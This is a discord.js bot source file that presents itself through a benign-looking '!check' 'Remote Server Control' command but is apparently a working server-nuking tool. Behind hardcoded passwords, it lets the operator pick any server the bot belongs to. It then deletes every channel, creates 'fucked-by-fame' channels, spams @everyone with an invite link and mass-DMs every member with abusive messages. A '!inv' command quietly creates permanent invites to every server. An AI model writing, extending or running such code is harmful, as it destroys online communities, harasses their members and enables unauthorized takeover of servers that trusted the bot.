const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  MessageFlags
} = require('discord.js');

const express = require('express');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';
const NUKE_PASSWORD = 'meka123';

const userSessions = new Map();

const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

const TOKEN = process.env.TOKEN;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

client.once('ready', () => {
  console.log(`${client.user.tag} is online`);
});

// ====================== MESSAGE COMMANDS ======================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;
  const content = message.content.trim().toLowerCase();

  if (content === '!check') {
    const embed = new EmbedBuilder()
      .setColor('#00ff00')
      .setTitle('🔍 Remote Server Control')
      .setDescription('Select any server → Raid or Nuke')
      .setFooter({ text: 'Only you can use this' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`check_start_${message.author.id}`)
        .setLabel('Start')
        .setStyle(ButtonStyle.Primary)
    );

    return message.reply({ embeds: [embed], components: [row] });
  }

  if (content === '!inv') {
    const guilds = Array.from(client.guilds.cache.values());
    if (guilds.length === 0) return message.reply('❌ Bot is not in any servers.');

    const embed = new EmbedBuilder()
      .setColor('#00ffff')
      .setTitle('📋 Bot Servers & Invites');

    for (const guild of guilds) {
      let inviteLink = 'Failed';
      try {
        const invite = await guild.invites.create(guild.channels.cache.find(c => c.type === 0)?.id, { maxAge: 0 });
        inviteLink = invite.url;
      } catch {}
      embed.addFields({ name: guild.name, value: `**Members:** ${guild.memberCount}\n**Invite:** ${inviteLink}`, inline: false });
    }
    await message.reply({ embeds: [embed] });
  }
});

// ====================== INTERACTIONS ======================
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const parts = interaction.customId.split('_');
    const action = parts[0];
    const userId = parts[parts.length - 1];

    if (interaction.user.id !== userId) {
      return interaction.reply({ content: '❌ This is not for you.', flags: MessageFlags.Ephemeral });
    }

    if (action !== 'check') return;

    if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
      const modal = new ModalBuilder()
        .setCustomId(`check_modal_${interaction.user.id}`)
        .setTitle('Enter Password');
      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
      ));
      return await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
      const password = interaction.fields.getTextInputValue('password');
      if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });

      const guilds = Array.from(client.guilds.cache.values());
      const options = guilds.map(g => ({
        label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
        value: g.id,
        description: `${g.memberCount} members`
      }));

      const select = new StringSelectMenuBuilder()
        .setCustomId(`check_server_select_${interaction.user.id}`)
        .setPlaceholder('Select server')
        .addOptions(options);

      await interaction.reply({
        content: '✅ Password accepted. Select server:',
        components: [new ActionRowBuilder().addComponents(select)],
        flags: MessageFlags.Ephemeral
      });
      userSessions.set(interaction.user.id, {});
    }

    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
      await interaction.deferUpdate();
      const guild = client.guilds.cache.get(interaction.values[0]);
      if (!guild) return interaction.editReply({ content: '❌ Server not found.' });

      userSessions.set(interaction.user.id, { guildId: guild.id });

      const actionSelect = new StringSelectMenuBuilder()
        .setCustomId(`check_action_select_${interaction.user.id}`)
        .setPlaceholder('Choose action')
        .addOptions([
          { label: '🔥 Raid', value: 'raid' },
          { label: '☢️ Nuke', value: 'nuke' }
        ]);

      await interaction.editReply({
        content: `**Selected:** ${guild.name}\nChoose action:`,
        components: [new ActionRowBuilder().addComponents(actionSelect)]
      });
    }

    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
      if (interaction.values[0] === 'nuke') {
        const modal = new ModalBuilder()
          .setCustomId(`check_nuke_modal_${interaction.user.id}`)
          .setTitle('Confirm Nuke');
        modal.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder().setCustomId('password').setLabel('Nuke Password').setStyle(TextInputStyle.Short).setRequired(true)
        ));
        return await interaction.showModal(modal);
      }
    }

    // ==================== RELIABLE NUKE ====================
    if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
      const password = interaction.fields.getTextInputValue('password');
      if (password !== NUKE_PASSWORD) {
        return interaction.reply({ content: '❌ Wrong nuke password.', flags: MessageFlags.Ephemeral });
      }

      await interaction.deferReply({ flags: MessageFlags.Ephemeral });

      const session = userSessions.get(interaction.user.id);
      const guild = client.guilds.cache.get(session?.guildId);
      if (!guild) return interaction.editReply({ content: '❌ Server not found.' });

      const delay = ms => new Promise(r => setTimeout(r, ms));
      const invite = 'https://discord.gg/NANQMy3WnD';
      const spamText = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;

      try {
        await interaction.editReply({ content: `☢️ Deleting all channels...` });

        // Delete all channels
        for (const channel of guild.channels.cache.values()) {
          await channel.delete().catch(() => {});
          await delay(500);
        }

        // Create channels
        await interaction.followUp({ content: '🔨 Creating fucked-by-fame channels...', flags: MessageFlags.Ephemeral });

        const created = [];
        for (let i = 0; i < 18; i++) {
          try {
            const chan = await guild.channels.create({
              name: 'fucked-by-fame',
              type: 0,
              reason: 'Fame Takeover'
            });
            created.push(chan);
            await delay(650);
          } catch (e) { break; }
        }

        // Spam
        await interaction.followUp({ content: `💥 Fast spamming @everyone...`, flags: MessageFlags.Ephemeral });

        for (const channel of created) {
          for (let i = 0; i < 10; i++) {
            channel.send(spamText).catch(() => {});
          }
        }

        // DMs
        await interaction.followUp({ content: '📨 Sending DMs to members...', flags: MessageFlags.Ephemeral });
        let dmSent = 0;
        const members = await guild.members.fetch();

        for (const member of members.values()) {
          if (member.user.bot) continue;
          try {
            await member.send(`**FAME TAKEN OVER**\n${invite}\n**fucked by veynetta**`).catch(() => {});
            dmSent++;
            await delay(800);
          } catch {}
        }

        await interaction.followUp({ 
          content: `✅ **NUKE COMPLETE**\nCreated **${created.length}** \`fucked-by-fame\` channels\nFast @everyone spam + ${dmSent} DMs sent`,
          flags: MessageFlags.Ephemeral 
        });

      } catch (err) {
        console.error(err);
        await interaction.followUp({ content: '⚠️ Nuke partially completed.', flags: MessageFlags.Ephemeral }).catch(() => {});
      }

      userSessions.delete(interaction.user.id);
    }

  } catch (error) {
    console.error('Interaction Error:', error);
    if (!interaction.replied && !interaction.deferred) {
      interaction.reply({ content: '❌ Something went wrong.', flags: MessageFlags.Ephemeral }).catch(() => {});
    }
  }
});

client.login(TOKEN);
